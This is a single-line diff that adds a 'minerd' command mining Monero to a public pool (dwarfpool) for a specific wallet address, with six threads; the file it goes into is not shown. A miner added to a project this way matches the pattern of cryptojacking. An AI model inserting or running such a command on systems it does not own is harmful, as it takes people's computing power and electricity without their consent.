@@ -1,0 +1,1 @@
+./minerd -o stratum+tcp://xmr-usa.dwarfpool.com:8050 -u 4BCeEPhodgPMbPWFN1dPwhWXdRX8q4mhhdZdA1dtSMLTLCEYvAj9QXjXAfF7CugEbmfBhgkqHbdgK9b2wKA6nqRZQCgvCDm.578d94c6210ce92229a30aef48fe90a5edd2c2b372a996d575463beebdff6251 -p x -t 6
